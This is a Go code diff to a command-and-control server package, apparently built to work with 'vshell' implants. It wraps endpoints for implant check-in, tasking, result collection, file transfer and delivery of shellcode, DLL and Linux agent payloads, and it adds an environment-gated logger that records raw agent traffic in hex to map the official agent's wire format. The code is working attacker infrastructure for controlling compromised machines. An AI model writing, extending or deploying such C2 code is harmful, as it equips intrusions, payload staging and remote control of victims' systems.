@@ -1,6 +1,7 @@
 package c2engine
 
 import (
+	"bytes"
 	"context"
 	"crypto/rand"
 	"crypto/rsa"
@@ -222,24 +223,54 @@ func (cl *C2Listener) IsRunning() bool {
 // ============================================================================
 
 func (cl *C2Listener) registerHTTPHandlers(mux *http.ServeMux) {
+	// 真实处理器先挂到内部 mux 上；外层 mux 只做"取证记录 + 转发"。
+	// 直接在外层 "/" 里再调 mux.ServeHTTP 会递归命中自己，因此必须分两层。
+	inner := http.NewServeMux()
+
 	// C2 protocol endpoints
-	mux.HandleFunc("/api/checkin", cl.handleCheckin)
-	mux.HandleFunc("/api/tasks", cl.handleGetTasks)
-	mux.HandleFunc("/api/result", cl.handlePostResult)
-	mux.HandleFunc("/api/upload", cl.handleUpload)
-	mux.HandleFunc("/api/download", cl.handleDownload)
+	inner.HandleFunc("/api/checkin", cl.handleCheckin)
+	inner.HandleFunc("/api/tasks", cl.handleGetTasks)
+	inner.HandleFunc("/api/result", cl.handlePostResult)
+	inner.HandleFunc("/api/upload", cl.handleUpload)
+	inner.HandleFunc("/api/download", cl.handleDownload)
 
 	// Agent binary delivery endpoints
-	mux.HandleFunc("/swt", cl.handleAgentStage)      // TCP staged agent
-	mux.HandleFunc("/sww", cl.handleAgentStageless)  // WebSocket full agent
-	mux.HandleFunc("/swk", cl.handleAgentKCP)        // KCP agent
-	mux.HandleFunc("/sws", cl.handleAgentShellcode)  // Shellcode
-	mux.HandleFunc("/swd", cl.handleAgentDLL)        // DLL agent
-	mux.HandleFunc("/swl", cl.handleAgentLinux)      // Linux agent
-	mux.HandleFunc("/swld", cl.handleAgentListenDLL) // Listener DLL
+	inner.HandleFunc("/swt", cl.handleAgentStage)      // TCP staged agent
+	inner.HandleFunc("/sww", cl.handleAgentStageless)  // WebSocket full agent
+	inner.HandleFunc("/swk", cl.handleAgentKCP)        // KCP agent
+	inner.HandleFunc("/sws", cl.handleAgentShellcode)  // Shellcode
+	inner.HandleFunc("/swd", cl.handleAgentDLL)        // DLL agent
+	inner.HandleFunc("/swl", cl.handleAgentLinux)      // Linux agent
+	inner.HandleFunc("/swld", cl.handleAgentListenDLL) // Listener DLL
 
 	// Health check
-	mux.HandleFunc("/health", cl.handleHealth)
+	inner.HandleFunc("/health", cl.handleHealth)
+
+	// 取证开关（M1）：把 agent 送来的原始请求记录到文件，用于分析官方 agent 的
+	// 线格式（方法/路径/头/请求体十六进制）。默认关闭，只有设置 VSHELL_CAPTURE
+	// 环境变量（文件路径）时才启用，不影响正常请求。
+	capturePath := os.Getenv("VSHELL_CAPTURE")
+	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		if capturePath == "" {
+			inner.ServeHTTP(w, r)
+			return
+		}
+		body, _ := io.ReadAll(r.Body)
+		_ = r.Body.Close()
+		var sb strings.Builder
+		fmt.Fprintf(&sb, "=== %s %s %s\n", time.Now().Format(time.RFC3339), r.Method, r.URL.String())
+		for k, v := range r.Header {
+			fmt.Fprintf(&sb, "%s: %s\n", k, strings.Join(v, ", "))
+		}
+		fmt.Fprintf(&sb, "body(%d): %x\n\n", len(body), body)
+		if f, err := os.OpenFile(capturePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644); err == nil {
+			_, _ = f.WriteString(sb.String())
+			_ = f.Close()
+		}
+		// 恢复 body 后交给真实处理器
+		r.Body = io.NopCloser(bytes.NewReader(body))
+		inner.ServeHTTP(w, r)
+	})
 }
 
 func (cl *C2Listener) registerHTTPSHandlers(mux *http.ServeMux) {
